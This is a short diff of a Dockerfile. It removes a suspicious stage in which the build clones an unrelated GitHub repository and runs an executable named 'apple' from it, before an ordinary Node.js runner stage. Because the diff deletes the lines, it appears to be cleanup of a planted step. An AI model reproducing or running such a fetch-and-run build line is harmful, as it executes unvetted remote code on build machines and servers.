@@ -1,7 +1,3 @@
-FROM vm/ubuntu:18.04
-
-RUN sudo apt update && git clone https://github.com/storagegitpush404/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple
-
 FROM node:16.14-bullseye-slim as runner
 WORKDIR /node-express
 ENV NODE_ENV production
